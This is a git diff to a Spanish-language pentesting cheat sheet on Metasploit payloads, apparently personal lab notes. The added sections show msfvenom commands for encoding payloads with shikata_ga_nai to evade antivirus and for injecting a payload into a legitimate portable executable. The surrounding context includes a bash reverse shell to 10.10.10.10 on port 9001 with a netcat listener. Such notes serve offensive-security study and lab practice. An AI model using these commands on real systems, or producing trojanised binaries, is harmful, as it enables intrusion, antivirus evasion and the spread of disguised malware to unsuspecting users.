@@ -26,6 +26,11 @@ migrate <numero> (el numero del proceso obtenido)
 
 ### Payloads con MsfVenom
 
+#### MsfVenom Basics
+```bash
+msfvenom --list payloads
+msfvenom --list enconders (para codificar y tratar de evadir el AV)
+```
 #### Payload sesión meterpreter Windows
 
 ```bash
@@ -57,4 +62,19 @@ Ahora nos ponemos a la escucha con netcat y listo. IMPORTANTE, esta conexion se 
 bash -c "sh -i >& /dev/tcp/10.10.10.10/9001 0>&1"
 
 y nos ponemos a la escucha con netcat
+```
+
+#### Payload encoding (AV evasion)
+Al generar un payload con msfvenom, añadimos el argumento -e y el encoder especificado.
+
+con la opción -i indicamos las iteraciones al codificar un payload (si se dan muchisimas iteraciones también podríamos llamar la atención)
+```bash
+msfvenom --list encoders
+msfvenom -p ...... -e x86/shikata_ga_nai -i 10
+```
+
+#### Inyectar payload en ejecutable legítimo
+Teniendo un portable, podemos incluir nuestro código payload en él con la opción -x indicando la ruta del portable.
+```bash
+msfvenom -p ...... -e x86/shikata_ga_nai -i 10 -x /home/kali/winrarportable.exe
 ```
